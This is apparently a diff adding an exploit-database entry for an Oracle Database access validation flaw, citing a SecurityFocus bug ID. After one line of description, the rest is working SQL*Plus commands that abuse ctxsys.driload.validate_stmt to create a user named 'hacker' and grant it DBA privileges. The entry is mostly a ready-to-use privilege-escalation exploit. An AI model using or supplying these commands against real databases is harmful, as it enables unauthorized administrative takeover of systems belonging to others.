@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/11099/info
+
+Oracle Database Server is prone to an access validation vulnerability that may permit unprivileged users to execute commands as the DBA. This could compromise the database.
+
+SQL> exec ctxsys.driload.validate_stmt
+('create user hacker identified by hacker');
+SQL> exec ctxsys.driload.validate_stmt('grant dba, connect to hacker');
